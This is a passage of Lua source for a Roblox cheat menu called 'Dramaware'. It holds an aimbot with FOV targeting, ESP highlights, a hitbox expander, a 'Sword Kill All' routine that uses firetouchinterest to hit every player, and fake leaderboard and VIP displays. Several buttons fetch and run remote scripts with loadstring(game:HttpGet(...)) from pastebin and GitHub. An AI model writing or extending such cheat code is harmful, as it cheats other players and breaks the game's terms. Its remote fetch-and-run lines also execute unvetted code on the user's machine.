                    for _, v in ipairs(game.ReplicatedStorage.Season.Players:GetChildren()) do
                        if v.Value == stat then
                            local targetPlayer = game.Players:FindFirstChild(v.Name)
                            if not targetPlayer or not targetPlayer.Character then return end
                            if playerHighlight then playerHighlight:Destroy() end
                            playerHighlight = Instance.new("Highlight")
                            playerHighlight.FillColor = Color3.fromRGB(255, 221, 0)
                            playerHighlight.OutlineColor = Color3.fromRGB(255, 221, 0)
                            playerHighlight.FillTransparency = 0.5
                            playerHighlight.OutlineTransparency = 0
                            playerHighlight.Parent = targetPlayer.Character
                            break
                        end
                    end
                end
            else
                if playerHighlight then
                    playerHighlight:Destroy()
                    playerHighlight = nil
                end
            end
        end,
    })

    -- universal aimbot variables
    local Players_U = game:GetService("Players")
    local RunService_U = game:GetService("RunService")
    local LocalPlayer_U = Players_U.LocalPlayer
    local Camera_U = workspace.CurrentCamera

    local Config = {
       aimbotEnabled = false,
       highlightEnabled = false,
       hitboxEnabled = false,
       smoothness = 50,
       maxDistance = 500,
       fov = 150,
       aimPart = "Head",
       requireVisibility = true,
       hitboxSize = 0.5
    }

    local playerConnections_U = {}
    local playerHitboxParts = {}
    local playerHighlights_U = {}

    local fovCircle = Drawing.new("Circle")
    fovCircle.Thickness = 2
    fovCircle.Color = Color3.new(1,1,1)
    fovCircle.Transparency = 0.9
    fovCircle.Filled = false
    fovCircle.Radius = Config.fov
    fovCircle.Visible = false

    local screenCenter_U = Vector2.new(0, 0)

    local function removeHighlight_U(p)
       if playerHighlights_U[p] then
          playerHighlights_U[p]:Destroy()
          playerHighlights_U[p] = nil
       end
    end

    local function applyHighlight_U(p)
       if not Config.highlightEnabled or p == LocalPlayer_U then return end
       removeHighlight_U(p)
       local character = p.Character
       if character then
          local h = Instance.new("Highlight")
          h.FillColor = Color3.fromRGB(255, 50, 50)
          h.OutlineColor = Color3.fromRGB(255, 255, 255)
          h.FillTransparency = 0.6
          h.OutlineTransparency = 0
          h.DepthMode = Enum.HighlightDepthMode.Occluded
          h.Parent = character
          playerHighlights_U[p] = h
       end
    end

    local function removeHitboxExpansion(p)
       if playerHitboxParts[p] then
          for _, part in ipairs(playerHitboxParts[p]) do
             if part and part.Parent then part:Destroy() end
          end
          playerHitboxParts[p] = nil
       end
    end

    local function applyHitboxExpansion(p)
       if not Config.hitboxEnabled or p == LocalPlayer_U then return end
       removeHitboxExpansion(p)
       local character = p.Character
       if not character then return end
       playerHitboxParts[p] = {}
       local parts = {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart"}
       for _, partName in ipairs(parts) do
          local original = character:FindFirstChild(partName)
          if original and original:IsA("BasePart") then
             local expander = Instance.new("Part")
             expander.Name = "HitboxExpander"
             expander.Size = original.Size + Vector3.new(Config.hitboxSize, Config.hitboxSize, Config.hitboxSize)
             expander.CanCollide = false
             expander.CanTouch = false
             expander.CanQuery = true
             expander.Transparency = 1
             expander.Anchored = false
             expander.Parent = character
             local weld = Instance.new("WeldConstraint")
             weld.Part0 = expander
             weld.Part1 = original
             weld.Parent = expander
             table.insert(playerHitboxParts[p], expander)
          end
       end
    end

    local function onPlayerAdded_U(p)
       playerConnections_U[p] = {}
       playerConnections_U[p].CharacterAdded = p.CharacterAdded:Connect(function()
          task.wait(0.1)
          applyHighlight_U(p)
          applyHitboxExpansion(p)
       end)
       if p.Character then
          applyHighlight_U(p)
          applyHitboxExpansion(p)
       end
    end

    local function onPlayerRemoving_U(p)
       removeHighlight_U(p)
       removeHitboxExpansion(p)
       if playerConnections_U[p] then
          for _, conn in pairs(playerConnections_U[p]) do
             conn:Disconnect()
          end
          playerConnections_U[p] = nil
       end
    end

    local function getClosestTarget_U()
       local closest, minDist = nil, Config.fov
       if not LocalPlayer_U.Character or not LocalPlayer_U.Character:FindFirstChild("HumanoidRootPart") then return nil end
       local params = RaycastParams.new()
       params.FilterType = Enum.RaycastFilterType.Blacklist
       params.FilterDescendantsInstances = {LocalPlayer_U.Character}
       local center = Vector2.new(screenCenter_U.X, screenCenter_U.Y)
       for p, _ in pairs(playerConnections_U) do
          if p == LocalPlayer_U then continue end
          local char = p.Character
          local target = char and char:FindFirstChild(Config.aimPart)
          local hum = char and char:FindFirstChildOfClass("Humanoid")
          if target and hum and hum.Health > 0 then
             local dist = (char.PrimaryPart.Position - LocalPlayer_U.Character.PrimaryPart.Position).Magnitude
             if dist <= Config.maxDistance then
                local screenPos, onScreen = Camera_U:WorldToViewportPoint(target.Position)
                if onScreen then
                   local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
                   if screenDist < minDist then
                      local visible = true
                      if Config.requireVisibility then
                         local result = workspace:Raycast(Camera_U.CFrame.Position, (target.Position - Camera_U.CFrame.Position).Unit * dist, params)
                         visible = not result or result.Instance:IsDescendantOf(char)
                      end
                      if visible then
                         minDist = screenDist
                         closest = target
                      end
                   end
                end
             end
          end
       end
       return closest
    end

    Players_U.PlayerAdded:Connect(onPlayerAdded_U)
    Players_U.PlayerRemoving:Connect(onPlayerRemoving_U)
    for _, p in ipairs(Players_U:GetPlayers()) do
       if p ~= LocalPlayer_U then onPlayerAdded_U(p) end
    end

    local lastTime_U = tick()
    RunService_U.Heartbeat:Connect(function()
       screenCenter_U = Vector2.new(Camera_U.ViewportSize.X / 2, Camera_U.ViewportSize.Y / 2)
       local currentTime = tick()
       local deltaTime = currentTime - lastTime_U
       lastTime_U = currentTime
       fovCircle.Visible = Config.aimbotEnabled
       if Config.aimbotEnabled then
          fovCircle.Position = screenCenter_U
          fovCircle.Radius = Config.fov
       end
       if Config.aimbotEnabled and LocalPlayer_U.Character and LocalPlayer_U.Character:FindFirstChild("Head") then
          local target = getClosestTarget_U()
          if target then
             local targetCFrame = CFrame.new(Camera_U.CFrame.Position, target.Position)
             local smooth = 1 - math.exp(-Config.smoothness * deltaTime)
             Camera_U.CFrame = Camera_U.CFrame:Lerp(targetCFrame, smooth)
          end
       end
    end)

    _utab:CreateSection("Combat")
    _utab:CreateToggle({
        Name = "Aimbot",
        CurrentValue = false,
        Flag = "UniversalAimbot",
        Callback = function(Value)
            Config.aimbotEnabled = Value
        end,
    })
    _utab:CreateToggle({
        Name = "ESP / Highlight",
        CurrentValue = false,
        Flag = "UniversalHighlight",
        Callback = function(Value)
            Config.highlightEnabled = Value
            for _, p in ipairs(Players_U:GetPlayers()) do
                if p ~= LocalPlayer_U then
                    if Value then applyHighlight_U(p) else removeHighlight_U(p) end
                end
            end
        end,
    })
    _utab:CreateToggle({
        Name = "Hitbox Expander",
        CurrentValue = false,
        Flag = "UniversalHitbox",
        Callback = function(Value)
            Config.hitboxEnabled = Value
            for _, p in ipairs(Players_U:GetPlayers()) do
                if p ~= LocalPlayer_U then
                    if Value then applyHitboxExpansion(p) else removeHitboxExpansion(p) end
                end
            end
        end,
    })
    _utab:CreateToggle({
        Name = "Require Visibility",
        CurrentValue = false,
        Flag = "UniversalRequireVisibility",
        Callback = function(Value)
            Config.requireVisibility = Value
        end,
    })
    _utab:CreateSlider({
        Name = "Aimbot Smoothness",
        Range = {1, 100},
        Increment = 1,
        Suffix = "",
        CurrentValue = 50,
        Flag = "UniversalSmoothness",
        Callback = function(Value)
            Config.smoothness = Value
        end,
    })
    _utab:CreateSlider({
        Name = "Max Distance",
        Range = {50, 1000},
        Increment = 10,
        Suffix = " studs",
        CurrentValue = 500,
        Flag = "UniversalMaxDistance",
        Callback = function(Value)
            Config.maxDistance = Value
        end,
    })
    _utab:CreateSlider({
        Name = "FOV Radius",
        Range = {10, 500},
        Increment = 5,
        Suffix = " px",
        CurrentValue = 150,
        Flag = "UniversalFOV",
        Callback = function(Value)
            Config.fov = Value
            fovCircle.Radius = Value
        end,
    })
    _utab:CreateSlider({
        Name = "Hitbox Size",
        Range = {0, 10},
        Increment = 0.5,
        Suffix = "",
        CurrentValue = 0.5,
        Flag = "UniversalHitboxSize",
        Callback = function(Value)
            Config.hitboxSize = Value
        end,
    })

    -- velocity editor
    local VE_Players = game:GetService("Players")
    local VE_RunService = game:GetService("RunService")
    local VE_UserInputService = game:GetService("UserInputService")
    local VE_LocalPlayer = VE_Players.LocalPlayer
    local VE_LedgeEnabled = false
    local VE_LedgeReach   = 0.5
    local VE_lastClimbTime = 0
    local VE_HeartbeatConn
    local VE_JumpConn

    local function VE_StartHeartbeat()
        if VE_HeartbeatConn then VE_HeartbeatConn:Disconnect() end
        VE_HeartbeatConn = VE_RunService.Heartbeat:Connect(function()
            if not VE_LedgeEnabled then return end
            local char = VE_LocalPlayer.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            if not hrp or not hum then return end
            if hum.FloorMaterial ~= Enum.Material.Air then return end
            if hum:GetState() == Enum.HumanoidStateType.Climbing then return end
            if (tick() - VE_lastClimbTime) < 0.1 then return end
            local forward = Vector3.new(hrp.CFrame.LookVector.X, 0, hrp.CFrame.LookVector.Z).Unit
            local flatVel = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
            if flatVel:Dot(forward) < 0.5 then return end
            local params = RaycastParams.new()
            params.FilterDescendantsInstances = {char}
            params.FilterType = Enum.RaycastFilterType.Exclude
            local wallRay = workspace:Raycast(hrp.Position, forward * VE_LedgeReach, params)
            if not wallRay then return end
            local distToWall = (Vector3.new(wallRay.Position.X, hrp.Position.Y, wallRay.Position.Z) - hrp.Position).Magnitude
            local nativeRange = hrp.Size.Z / 2 + 0.6
            if distToWall <= nativeRange then return end
            local probeOrigin = Vector3.new(wallRay.Position.X, hrp.Position.Y + 3.5, wallRay.Position.Z)
            local topRay = workspace:Raycast(probeOrigin, Vector3.new(0, -5, 0), params)
            if not topRay then return end
            local heightDiff = topRay.Position.Y - hrp.Position.Y
            if heightDiff < -2.0 or heightDiff > 5.0 then return end
            if topRay.Normal.Y < 0.7 then return end
            local halfDepth = hrp.Size.Z / 2 + 0.05
            local snapPos   = wallRay.Position + wallRay.Normal * halfDepth
            hrp.CFrame = CFrame.new(
                Vector3.new(snapPos.X, hrp.Position.Y, snapPos.Z),
                Vector3.new(snapPos.X, hrp.Position.Y, snapPos.Z) + forward
            )
            VE_lastClimbTime = tick()
        end)
    end

    local function VE_StartJump()
        if VE_JumpConn then VE_JumpConn:Disconnect() end
        VE_JumpConn = VE_UserInputService.JumpRequest:Connect(function()
            local char = VE_LocalPlayer.Character
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            if not hum or not hrp then return end
            if hum:GetState() == Enum.HumanoidStateType.Climbing then
                if tick() - VE_lastClimbTime > 0.2 then
                end
            end
        end)
    end

    VE_StartHeartbeat()
    VE_StartJump()

    -- misc
    _utab:CreateSection("Misc")
    _utab:CreateButton({
        Name = "Shaders",
        Callback = function()
            local l = game:GetService("Lighting")
            local t = workspace.Terrain
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level21
            l.Technology             = Enum.Technology.ShadowMap
            l.ShadowSoftness         = 0.15
            l.ClockTime              = 9
            l.GeographicLatitude     = 41.73
            l.Brightness             = 5
            l.Ambient                = Color3.fromRGB(70, 70, 70)
            l.ColorShift_Top         = Color3.fromRGB(255, 138, 35)
            l.ColorShift_Bottom      = Color3.fromRGB(0, 0, 0)
            l.OutdoorAmbient         = Color3.fromRGB(135, 135, 135)
            l.GlobalShadows          = true
            l.EnvironmentDiffuseScale   = 1
            l.EnvironmentSpecularScale  = 1
            l.ExposureCompensation   = 0

            t.WaterReflectance  = 0.08
            t.WaterTransparency = 0.85
            t.WaterWaveSize     = 0.15
            t.WaterWaveSpeed    = 12
            t.WaterColor        = Color3.fromRGB(12, 84, 92)

            local sky = Instance.new("Sky", l)
            sky.SkyboxBk = "rbxassetid://271042516"
            sky.SkyboxDn = "rbxassetid://271077243"
            sky.SkyboxFt = "rbxassetid://271042556"
            sky.SkyboxLf = "rbxassetid://271042310"
            sky.SkyboxRt = "rbxassetid://271042467"
            sky.SkyboxUp = "rbxassetid://271077958"
        end,
    })

    _utab:CreateButton({
        Name = "Infinite Yield",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end,
    })

    _utab:CreateButton({
        Name = "Energize",
        Callback = function()
            loadstring(game:HttpGet("https://pastebin.com/raw/Cfeu2ZPc"))()
        end,
    })

    _utab:CreateButton({
        Name = "Fly V3",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
        end,
    })

    _utab:CreateButton({
        Name = "Sound Panel",
        Callback = function()
            loadstring(game:HttpGet("https://pastebin.com/raw/w3uzjgEq"))()
        end,
    })
    _utab:CreateDivider()
end

if isPractice then
    local Window = Rayfield:CreateWindow({
        Name = "dw-source - .gg/6PaSN7wepr",
        LoadingTitle = " dw-source (" .. game_type .. ")",
        LoadingSubtitle = "made by kobi, callie, claude and irib",
        ShowText = "Dramaware",
        Theme = chosen_theme,
        DisableRayfieldPrompts = true,
        DisableBuildWarnings = true,
        CustomUIStrings = {
            ["Rayfield"] = "Dramaware",
            ["Hide"] = "Hide",
            ["Show"] = "Show"
        },
        ConfigurationSaving = {
            Enabled = true,
            FolderName = "DramaWare",
            FileName = "Config"
        }
    })
    
    local InfoTab = Window:CreateTab("Practice", "info")
    InfoTab:CreateSection("Practice")
    InfoTab:CreateButton({
        Name = "Fling/Restart Day (Reanimate)",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxcheatck/reanimatescript/main/script.lua", true))()
        end,
    })
    local _swordKillAllConn = nil
    InfoTab:CreateToggle({
        Name = "Sword Kill All",
        CurrentValue = false,
        Flag = "PracticeSwordKillAll",
        Callback = function(Value)
            if Value then
                local char = player.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local oldCFrame = hrp and hrp.CFrame
                game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("PracticeMap"):FireServer("Movies", "Beach")
                if oldCFrame then
                    task.wait(0.5)
                    local newChar = player.Character
                    local newHrp = newChar and newChar:FindFirstChild("HumanoidRootPart")
                    if newHrp then
                        newHrp.CFrame = oldCFrame
                    end
                end
                task.spawn(function()
                    local backpack = player:WaitForChild("Backpack")
                    local tool = nil
                    local waited = 0
                    while waited < 3 do
                        for _, t in ipairs(backpack:GetChildren()) do
                            if t:IsA("Tool") then
                                tool = t
                                break
                            end
                        end
                        if tool then break end
                        task.wait(0.1)
                        waited = waited + 0.1
                    end
                    if tool then
                        local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
                        if hum then
                            hum:EquipTool(tool)
                        end
                    end
                end)
                local range = 1000000
                _swordKillAllConn = game:GetService("RunService").RenderStepped:Connect(function()
                    local p = game.Players:GetPlayers()
                    for i = 2, #p do
                        local v = p[i].Character
                        if v and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v:FindFirstChild("HumanoidRootPart") and player:DistanceFromCharacter(v.HumanoidRootPart.Position) <= range then
                            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
                            if tool and tool:FindFirstChild("Handle") then
                                tool:Activate()
                                for _, part in next, v:GetChildren() do
                                    if part:IsA("BasePart") then
                                        firetouchinterest(tool.Handle, part, 0)
                                        firetouchinterest(tool.Handle, part, 1)
                                    end
                                end
                            end
                        end
                    end
                end)
            else
                if _swordKillAllConn then
                    _swordKillAllConn:Disconnect()
                    _swordKillAllConn = nil
                end
            end
        end,
    })
    InfoTab:CreateDivider()

    local UniversalTab = Window:CreateTab("Universal", "globe")
    _BuildUniversalTab(UniversalTab)

    local ClientTab = Window:CreateTab("Visuals", "eye")
    _G.SelectedFont = nil
    _G.StaticColor = Color3.fromRGB(255, 182, 193)
    _G.StaticColorCustom = false
    _G.RainbowMode = false
    _G.RainbowSpeed = 0.5
    _G.CustomName = ""
    _G.UseCustomName = false
    
    ClientTab:CreateSection("Appearance")
    ClientTab:CreateButton({
        Name = "Fake #1 All Leaderboards",
        Callback = function()
            local Players = game:GetService("Players")
            local player = Players.LocalPlayer
            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=48&height=48&format=png"
            local boards = {
                workspace.Elements.MoviesWinLeaderboard,
                workspace.Elements.CampWinLeaderboard,
                workspace.Elements.ExpeditionWinLeaderboard
            }
            for _, board in pairs(boards) do
                local scrollFrame = board.SurfaceGui.ScrollingFrame
                for _, frame in pairs(scrollFrame:GetChildren()) do
                    if frame:IsA("Frame") then
                        local placeLabel = frame:FindFirstChild("Image") and frame.Image:FindFirstChild("Place")
                        if placeLabel and placeLabel.Text == "1" then
                            frame.PName.Text = player.Name
                            frame.Image.Image = avatarUrl
                            break
                        end
                    end
                end
            end
        end,
    })
    
    ClientTab:CreateButton({
        Name = "Apply Starborn Font",
        Callback = function()
            local _sfHttp = game:GetService("HttpService")
            local _sfTTF = "starborn.ttf"
            local _sfJSON = "Starborn.json"
            local _sfURL = "https://drive.google.com/uc?export=download&id=1k9H8G60p7iaJL4hHcyWEXgWJbONqam8_"
            local _sfMult = 0.6
            local _sfBlacklist = {
                "Chat", "BubbleChat", "ChatChannelParentFrame", "MessageLogDisplay",
                "DevConsoleMaster", "DeveloperConsole", "RobloxGui", "RobloxPromptGui",
                "PlayerList", "StatLabel", "StatusText"
            }
            local function _sfApply(obj)
                if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
                if obj:FindFirstAncestorOfClass("CoreGui") or obj:FindFirstAncestor("RobloxGui") then return end
                for _, name in ipairs(_sfBlacklist) do
                    if obj.Name == name or obj:FindFirstAncestor(name) then return end
                end
                obj.FontFace = Font.new(getcustomasset(_sfJSON))
                if not obj:GetAttribute("FontScaledV2") then
                    if obj.TextSize > 0 then
                        obj.TextSize = math.clamp(obj.TextSize * _sfMult, 8, 100)
                    end
                    obj:SetAttribute("FontScaledV2", true)
                end
            end
            if not isfile(_sfTTF) then
                writefile(_sfTTF, game:HttpGet(_sfURL))
            end
            writefile(_sfJSON, _sfHttp:JSONEncode({
                name = "Starborn",
                faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset(_sfTTF)}}
            }))
            for _, d in pairs(game:GetDescendants()) do pcall(_sfApply, d) end
            game.DescendantAdded:Connect(function(d)
                task.wait(0.1)
                pcall(_sfApply, d)
            end)
            Rayfield:Notify({
                Title = "Font Applied",
                Content = "Starborn font has been applied!",
                Duration = 4,
                Image = "type",
            })
        end,
    })
    
    ClientTab:CreateButton({
        Name = "Apply Minecraft Font",
        Callback = function()
            local _mcHttp = game:GetService("HttpService")
            local _mcTTF = "minecrafter.ttf"
            local _mcJSON = "Minecrafter.json"
            local _mcURL = "https://drive.google.com/uc?export=download&id=1_LSZQUGrKHzJctxK7Jp8rVRRVWIvdif4"
            local _mcMult = 0.6
            local function _mcApply(obj)
                if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
                if obj:FindFirstAncestorOfClass("CoreGui") or obj:FindFirstAncestor("RobloxGui") then return end
                obj.FontFace = Font.new(getcustomasset(_mcJSON))
                if not obj:GetAttribute("FontScaledMC") then
                    obj.TextSize = math.clamp(obj.TextSize * _mcMult, 8, 100)
                    obj:SetAttribute("FontScaledMC", true)
                end
            end
            if not isfile(_mcTTF) then
                writefile(_mcTTF, game:HttpGet(_mcURL))
            end
            writefile(_mcJSON, _mcHttp:JSONEncode({
                name = "Minecrafter",
                faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset(_mcTTF)}}
            }))
            for _, d in pairs(game:GetDescendants()) do pcall(_mcApply, d) end
            game.DescendantAdded:Connect(function(d)
                task.wait(0.1)
                pcall(_mcApply, d)
            end)
            Rayfield:Notify({
                Title = "Font Applied",
                Content = "Minecraft font has been applied!",
                Duration = 4,
                Image = "type",
            })
        end,
    })
    
    ClientTab:CreateInput({
       Name = "Custom Name",
       PlaceholderText = "Enter name here...",
       RemoveTextAfterFocusLost = false,
       Callback = function(Text)
           _G.CustomName = Text
           _G.UseCustomName = (Text ~= "")
       end,
    })
    
    ClientTab:CreateToggle({
        Name = "VIP Name Tag",
        CurrentValue = false,
        Flag = "VIPNameTagPractice",
        Callback = function(Value)
            local player = game.Players.LocalPlayer
            local char = player.Character
            if not char then return end
            local head = char:FindFirstChild("Head")
            if not head then return end
            local playerName = head:FindFirstChild("playerName")
            if not playerName then return end
            local vip = playerName:FindFirstChild("VIP")
            if vip then
                vip.Visible = Value
                for _, v in ipairs(vip:GetDescendants()) do
                    if v:IsA("GuiObject") then v.Visible = Value end
                end
            end
            for _, v in ipairs(playerName:GetDescendants()) do
                if v:IsA("TextLabel") or v:IsA("TextButton") then
                    if Value then
                        if not _G.VIPOrigColors then _G.VIPOrigColors = {} end
                        if not _G.VIPOrigColors[v] then _G.VIPOrigColors[v] = v.TextColor3 end
                        v.TextColor3 = Color3.fromRGB(255, 165, 0)
                    else
                        if _G.VIPOrigColors and _G.VIPOrigColors[v] then
                            v.TextColor3 = _G.VIPOrigColors[v]
                            _G.VIPOrigColors[v] = nil
                        end
                    end
                end
            end
        end,
    })
    
    ClientTab:CreateToggle({
       Name = "Rainbow Effect",
       CurrentValue = false,
       Flag = "RainbowToggle",
       Callback = function(Value)
          _G.RainbowMode = Value
       end,
    })
    
    ClientTab:CreateColorPicker({
        Name = "Static Color",
        Color = Color3.fromRGB(255, 182, 193),
        Flag = "ColorPicker",
        Callback = function(Value)
            _G.StaticColor = Value
            _G.StaticColorCustom = true
        end
    })
    
    ClientTab:CreateDropdown({
        Name = "UI Theme",
        Options = {"Default", "AmberGlow", "Amethyst", "Bloom", "DarkBlue", "Green", "Light", "Ocean", "Serenity"},
        CurrentOption = {chosen_theme},
        MultipleOptions = false,
        Flag = "ThemeDropdown",
        Callback = function(option)
            Window.ModifyTheme(option[1])
            saveTheme(option[1])
        end,
    })

    ClientTab:CreateDivider()
    game:GetService("RunService").RenderStepped:Connect(function()
        local char = game.Players.LocalPlayer.Character
        if not char then return end
        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                if _G.UseCustomName and _G.CustomName ~= "" then
                    obj.Text = _G.CustomName
                end
                if _G.RainbowMode then
                    local hue = (tick() * _G.RainbowSpeed) % 1
                    obj.TextColor3 = Color3.fromHSV(hue, 0.6, 1)
                elseif _G.StaticColorCustom then
                    obj.TextColor3 = _G.StaticColor
                end
                obj.TextStrokeTransparency = 0.5
                obj.BackgroundTransparency = 1
            end
        end
    end)
    return
end

local Window = Rayfield:CreateWindow({
    Name = "dw-source - .gg/6PaSN7wepr",
    LoadingTitle = " dw-source (" .. game_type .. ")",
    LoadingSubtitle = "made by kobi, callie, claude and irib",
    ShowText = "Dramaware",
    Theme = chosen_theme,
    DisableRayfieldPrompts = true,
    DisableBuildWarnings = true,
    CustomUIStrings = {
        ["Rayfield"] = "Dramaware",
        ["Hide"] = "Hide",
        ["Show"] = "Show"
    },
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "DramaWare",
        FileName = "Config"
    }
})

local MainTab = Window:CreateTab("Main", "star")
local ChallengesTab = Window:CreateTab("Challenges", "trophy")
local AutoplayTab = Window:CreateTab("Autoplay", "play")
local CharactersTab = Window:CreateTab("Characters", "shirt")
local UniversalTab = Window:CreateTab("Universal", "globe")
local ToolsTab = Window:CreateTab("Tools", "wrench")
local ClientTab = Window:CreateTab("Visuals", "eye")
local SettingsTab = Window:CreateTab("Settings", "settings")

for _, _tab in ipairs({MainTab, ChallengesTab, AutoplayTab, CharactersTab, UniversalTab, ToolsTab, ClientTab, SettingsTab}) do
    DramaWare_PatchTab(_tab)
end

SettingsTab:CreateSection("UI")
SettingsTab:CreateLabel("Toggle the UI with K (changeable in Rayfield's own Settings tab).", "keyboard")

SettingsTab:CreateDropdown({
    Name = "UI Theme",
    Options = {"Default", "AmberGlow", "Amethyst", "Bloom", "DarkBlue", "Green", "Light", "Ocean", "Serenity"},
    CurrentOption = {chosen_theme},
    MultipleOptions = false,
    Flag = "ThemeDropdown",
    Callback = function(option)
        Window.ModifyTheme(option[1])
        saveTheme(option[1])
    end,
})

ClientTab:CreateSection("Client Sided Visuals")
ClientTab:CreateLabel("Skin Changer + Custom Skin Builder added + moved to Characters tab", "shirt")

local function equipGear(toolName)
    local _gearPlayer = game:GetService("Players").LocalPlayer
    local _gearChar = _gearPlayer.Character or _gearPlayer.CharacterAdded:Wait()
    local _gearHuman = _gearChar:WaitForChild("Humanoid")
    local _gearFolder = game:GetService("ReplicatedStorage").Products:FindFirstChild("Gear")
    if not _gearFolder then warn("[DramaWare] Gear folder not found!") return end
    local _gearTool = _gearFolder:FindFirstChild(toolName)
    if not _gearTool then warn("[DramaWare] Tool not found: " .. toolName) return end
    local _gearClone = _gearTool:Clone()
    _gearClone.Parent = _gearPlayer.Backpack
    _gearHuman:EquipTool(_gearClone)
end

ClientTab:CreateDropdown({
    Name = "Client Sided Gears",
    Options = {"Sword", "Dodgeball", "PaintballGun", "Meatball", "Snowball", "Pool Noodle", "Sheriff", "Key"},
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "GearDropdown",
    Callback = function(selected)
        if selected and selected[1] and selected[1] ~= "" then
            equipGear(selected[1])
        end
    end,
})

ClientTab:CreateButton({
    Name = "Player Collision",
    Callback = function()
        local LP = game.Players.LocalPlayer
        for _, v in pairs(game.Players:GetPlayers()) do
            if v ~= LP and v.Character and v.Character:FindFirstChild("CHECKER") == nil then
                local checker = Instance.new("BoolValue", v.Character)
                checker.Name = "CHECKER"
                for _, part in pairs(v.Character:GetDescendants()) do
                    if part:IsA("Part") or part:IsA("MeshPart") then
                        local collider = Instance.new("Part", part)
                        collider.Size = part.Size
                        collider.Position = part.Position
                        collider.Transparency = 1
                        local weld = Instance.new("Weld", part)
                        weld.Part0 = part
                        weld.Part1 = collider
                    end
                end
            end
        end
    end,
})

ClientTab:CreateButton({
    Name = "Apply Starborn Font",
    Callback = function()
        local _sfHttp = game:GetService("HttpService")
        local _sfTTF = "starborn.ttf"
        local _sfJSON = "Starborn.json"
        local _sfURL = "https://drive.google.com/uc?export=download&id=1k9H8G60p7iaJL4hHcyWEXgWJbONqam8_"
        local _sfMult = 0.6
        local _sfBlacklist = {
            "Chat", "BubbleChat", "ChatChannelParentFrame", "MessageLogDisplay",
            "DevConsoleMaster", "DeveloperConsole", "RobloxGui", "RobloxPromptGui",
            "PlayerList", "StatLabel", "StatusText"
        }
        local function _sfApply(obj)
            if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
            if obj:FindFirstAncestorOfClass("CoreGui") or obj:FindFirstAncestor("RobloxGui") then return end
            for _, name in ipairs(_sfBlacklist) do
                if obj.Name == name or obj:FindFirstAncestor(name) then return end
            end
            obj.FontFace = Font.new(getcustomasset(_sfJSON))
            if not obj:GetAttribute("FontScaledV2") then
                if obj.TextSize > 0 then
                    obj.TextSize = math.clamp(obj.TextSize * _sfMult, 8, 100)
                end
                obj:SetAttribute("FontScaledV2", true)
            end
        end
        if not isfile(_sfTTF) then
            writefile(_sfTTF, game:HttpGet(_sfURL))
        end
        writefile(_sfJSON, _sfHttp:JSONEncode({
            name = "Starborn",
            faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset(_sfTTF)}}
        }))
        for _, d in pairs(game:GetDescendants()) do pcall(_sfApply, d) end
        game.DescendantAdded:Connect(function(d)
            task.wait(0.1)
            pcall(_sfApply, d)
        end)
        Rayfield:Notify({
            Title = "Font Applied",
            Content = "Starborn font has been applied!",
            Duration = 4,
            Image = "type",
        })
    end,
})

ClientTab:CreateButton({
    Name = "Apply Minecraft Font",
    Callback = function()
        local _mcHttp = game:GetService("HttpService")
        local _mcTTF = "minecrafter.ttf"
        local _mcJSON = "Minecrafter.json"
        local _mcURL = "https://drive.google.com/uc?export=download&id=1_LSZQUGrKHzJctxK7Jp8rVRRVWIvdif4"
        local _mcMult = 0.6
        local function _mcApply(obj)
            if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
            if obj:FindFirstAncestorOfClass("CoreGui") or obj:FindFirstAncestor("RobloxGui") then return end
            obj.FontFace = Font.new(getcustomasset(_mcJSON))
            if not obj:GetAttribute("FontScaledMC") then
                obj.TextSize = math.clamp(obj.TextSize * _mcMult, 8, 100)
                obj:SetAttribute("FontScaledMC", true)
            end
        end
        if not isfile(_mcTTF) then
            writefile(_mcTTF, game:HttpGet(_mcURL))
        end
        writefile(_mcJSON, _mcHttp:JSONEncode({
            name = "Minecrafter",
            faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset(_mcTTF)}}
        }))
        for _, d in pairs(game:GetDescendants()) do pcall(_mcApply, d) end
        game.DescendantAdded:Connect(function(d)
            task.wait(0.1)
            pcall(_mcApply, d)
        end)
        Rayfield:Notify({
            Title = "Font Applied",
            Content = "Minecraft font has been applied!",
            Duration = 4,
            Image = "type",
        })
    end,
})

ClientTab:CreateToggle({
    Name = "Show All Usernames",
    CurrentValue = false,
    Flag = "ShowUsernames",
    Callback = function(Value)
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Teams = game:GetService("Teams")

        local function getPlayerTeamColor(p)
            local playerData = ReplicatedStorage:FindFirstChild("Season")
                               and ReplicatedStorage.Season:FindFirstChild("Players")
                               and ReplicatedStorage.Season.Players:FindFirstChild(p.Name)
            if not playerData then return Color3.fromRGB(169, 169, 169) end
            local teamName = playerData:FindFirstChild("Team") and playerData.Team.Value
            if not teamName then return Color3.fromRGB(169, 169, 169) end
